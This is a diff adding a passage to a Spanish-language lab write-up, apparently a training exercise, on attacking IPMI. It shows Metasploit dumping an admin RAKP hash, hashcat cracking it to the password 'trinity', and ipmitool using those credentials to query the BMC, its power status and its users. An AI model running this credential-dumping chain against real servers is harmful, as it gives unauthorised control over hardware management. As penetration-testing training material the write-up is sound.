@@ -636,6 +636,58 @@ Esta versión IPMI 2.0:
 Paralelamente podemos utilizar el scanner de `Metasploit` `auxiliary/scanner/ipmi/ipmi_version`:
 <img width="1635" height="488" alt="image" src="https://github.com/user-attachments/assets/9374c395-1df9-4abe-87ee-1d78d293d9f8" />
 
+Ahora utilizamos el scanner de `Metasploit` `scanner/ipmi/ipmi_dumphashes` y obtenemos el usuario y el hash de su contraseña:
 
+<img width="1907" height="626" alt="image" src="https://github.com/user-attachments/assets/85bbe7c8-71c9-47f6-91ea-716fbcb626fb" />
+
+- `user`: `admin`
+- `hash` :`fc6a0f0e82040000e68e4aa455c2f3e3f2eeade9c16b1a6085d200b826b564bd6289055dfc7bee06a123456789abcdefa123456789abcdef140561646d696e:e6aa4754ad0ba0d5ec0c9400646142ffaac519fd`
 
 #### ¿Cuál es la contraseña en texto claro de la cuenta?
+
+
+Guardamos el hash encontrado en un archivo de texto llamado `ipmi.txt` y luego lo crackeamos con `hashcat`:
+```bash
+hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
+```
+
+Pero tiene tiempos de resolución muy largos.
+
+Por lo que procedemos a realizar un crackeo con la wordlist `rockyou.txt`, además no estamos seguros de quién es realmente el fabricante.
+
+```bash
+hashcat -m 7300 ipmi.txt /usr/share/wordlists/rockyou.txt
+```
+<img width="1906" height="709" alt="image" src="https://github.com/user-attachments/assets/2ceaf6d7-60b2-4c5b-a41c-3404b2af0f4f" />
+
+Obtenemos la contraseña `trinity`
+
+
+Para volver a ver los resultados realizamos:
+```bash
+hashcat -m 7300 ipmi.txt /usr/share/wordlists/rockyou.txt --show
+```
+
+
+Intentamos conectarnos a ftp y ssh con esas credenciales pero no es posible. Nos conectamos al `BMC`:
+```bash
+ipmitool -I lanplus -H 10.129.13.18 -U admin -P trinity mc info
+```
+`Nota`: `-I lanplus` → IPMI 2.0 (RAKP)
+`mc info` → pedir información del Management Controller
+<img width="901" height="654" alt="image" src="https://github.com/user-attachments/assets/1cd1f238-33ed-475c-b43a-3cca0e44b548" />
+
+Realizamos:
+```bash
+ipmitool -I lanplus -H 10.129.13.18 -U admin -P trinity chassis power status
+```
+<img width="1043" height="130" alt="image" src="https://github.com/user-attachments/assets/91d8b142-ee7b-4984-931d-44339b306ca2" />
+
+Si hubiera dicho `Chassis Power is on` hubiese significado que teníamos control total sobre la energía física.
+
+
+Realizamos el siguiente comando para listar los usuarios configurados:
+```bash
+ipmitool -I lanplus -H 10.129.13.18 -U admin -P trinity user list 1
+```
+<img width="996" height="760" alt="image" src="https://github.com/user-attachments/assets/130f98bf-48fb-4b41-88a9-512b9c48ff25" />
